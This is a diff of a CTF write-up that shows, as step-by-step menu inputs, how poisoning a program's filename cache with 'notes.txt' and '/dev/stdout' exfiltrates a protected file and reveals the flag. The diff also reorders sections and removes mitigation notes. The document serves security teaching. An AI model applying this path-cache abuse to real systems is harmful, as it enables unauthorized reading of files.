@@ -4,7 +4,7 @@
 
 ## Overview
 
-In this CTF task, we exploit a logic flaw in a file-handling program to exfiltrate the contents of `notes.txt` by poisoning a file cache and redirecting writes to `/dev/stdout`. No memory corruption is needed—just creative abuse of how filenames are cached and reused.
+In this CTF task, we exploit a logic flaw in a file-handling program to exfiltrate the contents of `notes.txt` by poisoning a file cache and redirecting writes to `/dev/stdout`. No memory corruption is needed just creative abuse of how filenames are cached and reused.
 
 ---
 
@@ -12,21 +12,15 @@ In this CTF task, we exploit a logic flaw in a file-handling program to exfiltra
 
 ```bash
 $ file main
-main: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
 ```
+
+![Alt text](img/1.png)
 
 ```bash
 $ pwn checksec main
-[*] '/home/dexter/Desktop/DataExfiltrationSystem/main'
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-    Stripped: No
 ```
 
----
+## ![Alt text](img/2.png)
 
 ## Reverse Engineering
 
@@ -68,6 +62,83 @@ This allows us to:
 ## Exfiltration Strategy (Pointer Poisoning)
 
 We poison the internal cache so that the append operation reads from `notes.txt` and writes to `/dev/stdout`, which is the program's output (our socket).
+
+---
+
+### Step-by-Step Exploit
+
+Assume a legit market file named `covenant_core` exists.
+
+#### 1. Open `covenant_core`
+
+```bash
+> 3
+Enter market name to open its file: covenant_core
+Opened covenant_core at fd 3 for appending.
+```
+
+#### 2. Poison cache with `notes.txt`
+
+```bash
+> 5
+Enter file name to close:     notes.txt
+Enter file descriptor:        3
+Closed file.
+```
+
+Now `recently_closed[0] = strdup("notes.txt")`
+
+#### 3. Reopen `covenant_core` to get a new file descriptor
+
+```bash
+> 3
+Enter market name to open its file: covenant_core
+Opened covenant_core at fd 3 for appending.
+```
+
+#### 4. Poison cache with `/dev/stdout`
+
+```bash
+> 5
+Enter file name to close:     /dev/stdout
+Enter file descriptor:        3
+Closed file.
+```
+
+Now `recently_closed[1] = strdup("/dev/stdout")`
+
+#### 5. Open `/dev/stdout` as a market file
+
+```bash
+> 3
+Enter market name to open its file: /dev/stdout
+Fast open via cache!
+Opened /dev/stdout at fd 3 for appending.
+```
+
+#### 6. Append `notes.txt` as a hacked file
+
+```bash
+> 4
+Enter hacked file name to append: notes.txt
+Fast open via cache!
+```
+
+The program will now:
+
+- Open `notes.txt` for reading
+- `fgets()` each line
+- `fputs()` them into `open_market_file`, which is `/dev/stdout`
+
+The contents of `notes.txt` are printed directly to your screen or socket.
+
+---
+
+## Why This Works
+
+- The first cache entry (`notes.txt`) lets us bypass the `hacked/` directory restriction.
+- The second cache entry (`/dev/stdout`) redirects output to your terminal.
+- This all works within the intended menu flow, without triggering memory corruption defenses.
 
 ---
 
@@ -161,113 +232,8 @@ io.interactive()
 
 ---
 
-### Step-by-Step Exploit
-
-Assume a legit market file named `covenant_core` exists.
-
-#### 1. Open `covenant_core`
-
-```bash
-> 3
-Enter market name to open its file: covenant_core
-Opened covenant_core at fd 3 for appending.
-```
-
-#### 2. Poison cache with `notes.txt`
-
-```bash
-> 5
-Enter file name to close:     notes.txt
-Enter file descriptor:        3
-Closed file.
-```
-
-Now `recently_closed[0] = strdup("notes.txt")`
-
-#### 3. Reopen `covenant_core` to get a new file descriptor
-
-```bash
-> 3
-Enter market name to open its file: covenant_core
-Opened covenant_core at fd 3 for appending.
-```
-
-#### 4. Poison cache with `/dev/stdout`
-
-```bash
-> 5
-Enter file name to close:     /dev/stdout
-Enter file descriptor:        3
-Closed file.
-```
-
-Now `recently_closed[1] = strdup("/dev/stdout")`
-
-#### 5. Open `/dev/stdout` as a market file
-
-```bash
-> 3
-Enter market name to open its file: /dev/stdout
-Fast open via cache!
-Opened /dev/stdout at fd 3 for appending.
-```
-
-#### 6. Append `notes.txt` as a hacked file
-
-```bash
-> 4
-Enter hacked file name to append: notes.txt
-Fast open via cache!
-```
-
-The program will now:
-
-- Open `notes.txt` for reading
-- `fgets()` each line
-- `fputs()` them into `open_market_file`, which is `/dev/stdout`
-
-The contents of `notes.txt` are printed directly to your screen or socket.
-
----
-
-## Why This Works
-
-- The first cache entry (`notes.txt`) lets us bypass the `hacked/` directory restriction.
-- The second cache entry (`/dev/stdout`) redirects output to your terminal.
-- This all works within the intended menu flow, without triggering memory corruption defenses.
-
----
-
-## Example Output
-
-```bash
-> 3
-Enter market name to open its file: /dev/stdout
-Fast open via cache!
-Opened /dev/stdout at fd 3 for appending.
-
-> 4
-Enter hacked file name to append: notes.txt
-Fast open via cache!
-[contents of notes.txt appear here]
-```
-
----
-
 ## Flag
 
 ```
 RedPointer{r00tP@ssw0rd}
 ```
-
----
-
-## Mitigation Suggestions
-
-- Sanitize paths even when they are from a cache.
-- Forbid filenames with `/`, absolute paths, or devices like `/dev/stdout`.
-- Normalize and validate all paths before use.
-
----
-
-Let me know if you’d like a Python exploit script or test automation for this.
